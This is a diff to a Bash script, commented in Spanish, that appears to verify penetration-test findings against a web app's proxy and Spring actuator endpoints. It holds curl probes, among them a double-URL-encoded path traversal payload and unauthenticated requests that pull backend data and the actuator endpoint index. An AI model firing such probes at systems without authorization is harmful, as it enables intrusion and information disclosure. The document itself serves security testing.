@@ -51,6 +51,10 @@ header "H1.c · Path traversal con doble URL-encoding"
 code=$(curl -sS -o /tmp/r1c.html -w "%{http_code}" "$HOST/proxy/orders/%2e%2e%2f%2e%2e%2factuator%2finfo")
 verdict "$code"; echo "  body: $(head -c 200 /tmp/r1c.html)"
 
+header "H1.d · /proxy/carts/test SIN cookie de sesión (datos del backend sin auth)"
+code=$(curl -sS -o /tmp/r1d.json -w "%{http_code}" "$HOST/proxy/carts/test")
+verdict "$code"; echo "  body: $(head -c 200 /tmp/r1d.json) (el proxy responde sin exigir sesión)"
+
 # -----------------------------------------------------------------------------
 # H2 · Validación parcial del Checkout (XSS / SQLi / CRLF)
 # -----------------------------------------------------------------------------
@@ -96,6 +100,10 @@ verdict "$code"; echo "  body: $(head -c 200 /tmp/r3.json)"
 header "H4.a · /actuator/info (versión, build, git)"
 code=$(curl -sS -o /tmp/r4a.json -w "%{http_code}" "$HOST/actuator/info")
 verdict "$code"; echo "  body: $(head -c 300 /tmp/r4a.json)"
+
+header "H4.a2 · /actuator (índice HAL: lista TODOS los endpoints actuator)"
+code=$(curl -sS -o /tmp/r4a2.json -w "%{http_code}" "$HOST/actuator")
+verdict "$code"; echo "  body: $(head -c 300 /tmp/r4a2.json)"
 
 header "H4.b · /actuator/health (estado de los downstreams)"
 code=$(curl -sS -o /tmp/r4b.json -w "%{http_code}" "$HOST/actuator/health")
